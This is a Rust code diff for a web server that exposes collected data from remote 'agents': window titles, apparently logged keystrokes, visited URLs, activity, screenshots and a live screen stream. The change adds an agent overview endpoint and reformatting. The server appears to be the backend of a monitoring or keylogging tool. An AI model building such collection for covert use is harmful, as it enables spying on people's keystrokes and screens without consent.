@@ -33,13 +33,14 @@ use crate::{db, state::AppState};
 
 pub fn router() -> Router<Arc<AppState>> {
     Router::new()
-        .route("/agents",              get(list_agents))
-        .route("/agents/:id/windows",  get(agent_windows))
-        .route("/agents/:id/keys",     get(agent_keys))
-        .route("/agents/:id/urls",     get(agent_urls))
+        .route("/agents", get(list_agents))
+        .route("/agents/overview", get(list_agents_overview))
+        .route("/agents/:id/windows", get(agent_windows))
+        .route("/agents/:id/keys", get(agent_keys))
+        .route("/agents/:id/urls", get(agent_urls))
         .route("/agents/:id/activity", get(agent_activity))
-        .route("/agents/:id/screen",   get(agent_screen))
-        .route("/agents/:id/mjpeg",    get(agent_mjpeg))
+        .route("/agents/:id/screen", get(agent_screen))
+        .route("/agents/:id/mjpeg", get(agent_mjpeg))
 }
 
 // ─── Handlers ─────────────────────────────────────────────────────────────────
@@ -47,8 +48,47 @@ pub fn router() -> Router<Arc<AppState>> {
 async fn list_agents(State(s): State<Arc<AppState>>) -> Response {
     match db::list_agents(&s.db).await {
         Ok(rows) => Json(serde_json::json!({ "agents": rows })).into_response(),
-        Err(e)   => err500(e),
+        Err(e) => err500(e),
     }
+}
+
+/// Overview list used by the dashboard sidebar: includes offline agents + last session times.
+async fn list_agents_overview(State(s): State<Arc<AppState>>) -> Response {
+    let agents = match db::list_agents(&s.db).await {
+        Ok(rows) => rows,
+        Err(e) => return err500(e),
+    };
+
+    let online: std::collections::HashMap<uuid::Uuid, chrono::DateTime<chrono::Utc>> = {
+        let map = s.agents.lock().unwrap();
+        map.iter().map(|(id, a)| (*id, a.connected_at)).collect()
+    };
+
+    let mut out: Vec<serde_json::Value> = Vec::with_capacity(agents.len());
+    for a in agents {
+        let id = match a["id"].as_str().and_then(|s| s.parse::<Uuid>().ok()) {
+            Some(id) => id,
+            None => continue,
+        };
+        let (last_connected_at, last_disconnected_at) =
+            match db::agent_last_session_times(&s.db, id).await {
+                Ok(v) => v,
+                Err(e) => return err500(e),
+            };
+        let connected_at = online.get(&id).copied();
+        out.push(serde_json::json!({
+            "id": id,
+            "name": a["name"],
+            "first_seen": a["first_seen"],
+            "last_seen": a["last_seen"],
+            "online": connected_at.is_some(),
+            "connected_at": connected_at,
+            "last_connected_at": last_connected_at,
+            "last_disconnected_at": last_disconnected_at
+        }));
+    }
+
+    Json(serde_json::json!({ "agents": out })).into_response()
 }
 
 #[derive(Deserialize)]
@@ -59,7 +99,9 @@ struct PageParams {
     offset: i64,
 }
 
-fn default_limit() -> i64 { 50 }
+fn default_limit() -> i64 {
+    50
+}
 
 async fn agent_windows(
     Path(id): Path<Uuid>,
@@ -68,7 +110,7 @@ async fn agent_windows(
 ) -> Response {
     match db::query_windows(&s.db, id, p.limit, p.offset).await {
         Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
-        Err(e)   => err500(e),
+        Err(e) => err500(e),
     }
 }
 
@@ -79,7 +121,7 @@ async fn agent_keys(
 ) -> Response {
     match db::query_keys(&s.db, id, p.limit, p.offset).await {
         Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
-        Err(e)   => err500(e),
+        Err(e) => err500(e),
     }
 }
 
@@ -90,7 +132,7 @@ async fn agent_urls(
 ) -> Response {
     match db::query_urls(&s.db, id, p.limit, p.offset).await {
         Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
-        Err(e)   => err500(e),
+        Err(e) => err500(e),
     }
 }
 
@@ -101,20 +143,17 @@ async fn agent_activity(
 ) -> Response {
     match db::query_activity(&s.db, id, p.limit, p.offset).await {
         Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
-        Err(e)   => err500(e),
+        Err(e) => err500(e),
     }
 }
 
 /// Serve the most-recent JPEG screenshot as a single image.
-async fn agent_screen(
-    Path(id): Path<Uuid>,
-    State(s): State<Arc<AppState>>,
-) -> Response {
+async fn agent_screen(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
     let frame = s.frames.lock().unwrap().get(&id).cloned();
     match frame {
         Some(data) => (
             [
-                (header::CONTENT_TYPE,  "image/jpeg"),
+                (header::CONTENT_TYPE, "image/jpeg"),
                 (header::CACHE_CONTROL, "no-cache, no-store"),
             ],
             data,
@@ -140,10 +179,7 @@ async fn agent_screen(
 /// - On the **last** viewer disconnecting (HTTP connection closes): a RAII
 ///   [`CaptureGuard`] sends `{"type":"stop_capture"}` so the agent idles at ~0 %
 ///   CPU until someone watches again.
-async fn agent_mjpeg(
-    Path(id): Path<Uuid>,
-    State(s): State<Arc<AppState>>,
-) -> Response {
+async fn agent_mjpeg(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
     const BOUNDARY: &str = "mjpegframe";
 
     // ── Viewer-count bookkeeping ──────────────────────────────────────────
@@ -163,7 +199,10 @@ async fn agent_mjpeg(
     // RAII guard: decrements the viewer count and — when it hits zero —
     // sends `stop_capture` to the agent.  Dropped when the HTTP connection
     // closes (stream future is dropped by Axum).
-    let guard = CaptureGuard { agent_id: id, state: s.clone() };
+    let guard = CaptureGuard {
+        agent_id: id,
+        state: s.clone(),
+    };
 
     // ── Streaming loop ────────────────────────────────────────────────────
     // Clone state so the stream closure can access frames independently.
@@ -246,7 +285,7 @@ async fn agent_mjpeg(
 /// If the count reaches zero, sends `{"type":"stop_capture"}` to the agent.
 struct CaptureGuard {
     agent_id: Uuid,
-    state:    Arc<AppState>,
+    state: Arc<AppState>,
 }
 
 impl Drop for CaptureGuard {
